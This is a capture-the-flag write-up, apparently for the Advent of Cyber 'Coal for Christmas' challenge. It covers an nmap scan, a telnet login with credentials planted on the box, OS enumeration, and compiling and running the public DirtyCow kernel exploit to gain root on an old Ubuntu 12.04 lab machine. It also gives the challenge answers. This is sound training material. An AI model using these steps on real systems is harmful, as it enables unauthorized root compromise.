# IP=10.10.181.85


### [Day 13] John Hammond - Coal For Christmas ###

1. What old, deprecated protocol and service is running?

	* Ran nmap scan: `nmap -sC -sV -oN nmap/initial $IP`
	* This looked out of place: `23/tcp  open  telnet  Linux telnetd`. Seems like an out-of-date ssh.

```
telnet
```

2. Connect to this service to see if you can make use of it. You can connect to the service with the standard command-line client, named after the name of the service, or netcat with syntax like this: `telnet 10.10.181.85 <PORT_FROM_NMAP_SCAN>`. What credential was left for you?

	* Ran the provided command with port 23. Was greeted with a lovely message providing me with credetials:
	```
	Username: santa
	Password: clauschristmas
	```
	* Used them to login.

```
clauschristmas
```

3. Perform some enumeration. What distribution of Linux and version number is this server running?

	* Was provided with some example enumeration commands, which helped me get the distribution and version:
		* `cat /etc/*release`
		* `uname -a`
		* `cat /etc/issue`

```
Ubuntu 12.04
```

4. Take a look at the cookies and milk that the server owners left for you. You can do this with the cat command as mentioned earlier (`cat cookies_and_milk.txt`). Who got here first?

```
grinch
```

5. Find a copy of the original DirtyCow exploit online (https://github.com/FireFart/dirtycow/blob/master/dirty.c), and get it on the target box. What is the verbatim syntax you can use to compile, taken from the real C source code comments?

	* Took me a hot second to find the right exploit relevant to this challenge. The link listed in the description is what I found and the file contains all the instructions you need.

```
gcc -pthread dirty.c -o dirty -lcrypt
```

6. Run the commands to compile the exploit, and run it. What "new" username was created, with the default operations of the real C source code?

	* Read dirty.c documentation.
	* Ran: `./dirty scottwashere`. This got a bit hung up so I had to hit Ctrl-C.
	* Switched into the new, escalated user account, firefart: `su firefart`.

```
firefart
```

7. Hop over to the /root directory to own this server. Uh oh, looks like that perpetrator left a message! Follow his instructions to prove you really did leave Coal for Christmas! After you leave behind the coal, you can run `tree | md5sum`. What is the MD5 hash output?

	* Created a new file, coal: `touch coal`
	* Generated the hash: `tree | md5sum`

```
8b16f00dd3b51efadb02c1df7f8427cc
```
